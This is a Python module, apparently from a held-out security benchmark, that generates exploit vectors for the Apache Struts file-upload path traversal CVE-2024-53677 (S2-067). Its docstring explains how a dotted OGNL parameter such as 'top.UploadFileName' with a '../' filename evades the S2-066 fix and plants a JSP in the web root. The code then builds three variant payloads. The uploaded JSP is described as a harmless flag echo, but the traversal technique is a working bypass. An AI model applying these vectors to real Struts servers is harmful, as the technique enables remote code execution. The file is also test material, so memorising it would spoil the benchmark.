#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-53677 (S2-067) residual for struts-fileupload-interceptor-path-traversal-rce.

S2-066's 6.3.0.2 fix made HttpParameters case-insensitive, so a *case-variant* of the bare filename
param (`uploadfilename` vs `uploadFileName`) now collides and is removed by the interceptor's
appendAll() -> the S2-066 seed is blocked. But the fix only dedupes on the BARE parameter name.
The S2-067 residual smuggles the traversal through a DOTTED OGNL expression that is not
case-equal to `uploadFileName`, so appendAll() never removes it:

    file  part : name="Upload";  filename="data.txt"       (body = benign flag-echo JSP)
    text  part : name="top.UploadFileName"                 value = "../pcb_res_<nonce>.jsp"

Two things make this reach on V1:
  (1) appendAll() only case-insensitively removes keys equal to the interceptor's own keys
      (Upload / UploadContentType / UploadFileName). `top.UploadFileName` is NOT equalsIgnoreCase
      any of them (the "top." prefix), so it SURVIVES the S2-066 dedup.
  (2) ParametersInterceptor (default ordered=false) applies params in natural String order,
      last-write-wins. Naming the FILE field `Upload` (capital 'U' = 0x55) makes the interceptor's
      safe key `UploadFileName` sort BEFORE the attacker's `top.UploadFileName` (lowercase 't' =
      0x74), so the OGNL `top.UploadFileName` -> setUploadFileName(traversal) is applied LAST and
      wins. And unlike a multipart filename, a text param is NOT run through getCanonicalName(),
      so the `../` survives.
The JSP is therefore written to the web root -> GET /pcb_res_<nonce>.jsp echoes ${PCB_FLAG}
(REACHES on V1 -- the SAME path-traversal sink, only the param spelling defeats the S2-066 dedup).

On V2 (6.4.0) the app is migrated to ActionFileUploadInterceptor + UploadedFilesAware: the file
name is framework-controlled (getOriginalName()) and is no longer an OGNL-settable request param,
so `top.UploadFileName` cannot steer the destination -> the file lands under /uploads/ with its
benign name -> GET returns 404 (BLOCKED).

Case-variant spellings of the same dotted trick are kept as alternates in VECTORS; the oracle tries
each and reports the first that reaches the flag.

BENIGN CANARY: the uploaded JSP only echoes System.getenv("PCB_FLAG"); no webshell / exec.
"""


def _vec(vid, file_field, param, nonce):
    return {
        "id": vid,
        # capital-initial file field so the interceptor's safe `UploadFileName` sorts BEFORE the
        # attacker's dotted `top.*` param under the natural-order ParametersInterceptor:
        "file_field": file_field,
        "file_filename": "data.txt",
        "text_fields": [[param, "../pcb_res_%s.jsp" % nonce]],
        "target_jsp": "/pcb_res_%s.jsp" % nonce,
    }


# Builders (each takes the per-run nonce). Primary = documented `top.UploadFileName` over a capital
# `Upload` file field; alternates vary the case of the dotted param / file field.
VECTORS = [
    lambda n: _vec("cve-2024-53677-Upload-top.UploadFileName", "Upload", "top.UploadFileName", n),
    lambda n: _vec("cve-2024-53677-Upload-top.uploadFileName", "Upload", "top.uploadFileName", n),
    lambda n: _vec("cve-2024-53677-Upload-top[UploadFileName]", "Upload", "top['UploadFileName']", n),
]


def candidate(builder, nonce):
    return builder(nonce)


if __name__ == "__main__":
    import json
    print(json.dumps([v("demo") for v in VECTORS], indent=2))
